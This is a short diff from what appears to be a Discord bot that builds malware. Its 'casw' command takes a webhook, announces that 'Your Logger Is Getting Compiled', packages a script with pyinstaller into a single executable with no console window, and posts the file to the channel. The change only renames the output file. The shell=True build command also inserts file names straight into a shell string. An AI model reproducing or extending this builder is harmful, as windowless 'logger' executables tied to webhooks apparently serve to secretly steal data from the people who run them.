@@ -352,7 +352,7 @@ def casw(ctx, webhook):
         embed.add_field(name=f"{config['name']} Builder", value="```Your Logger Is Getting Compiled.```")
         message = asyncio.run_coroutine_threadsafe(ctx.send(embed=embed), bot.loop).result()
         
-        subprocess.run(f"pyinstaller --onefile --noconsole {sf}", shell=True, check=True)
+        subprocess.run(f"pyinstaller --onefile --noconsole {sf} --name {ef}", shell=True, check=True)
         
         with open(f"dist/{ef}", "rb") as f:
             file = discord.File(f, filename=ef)
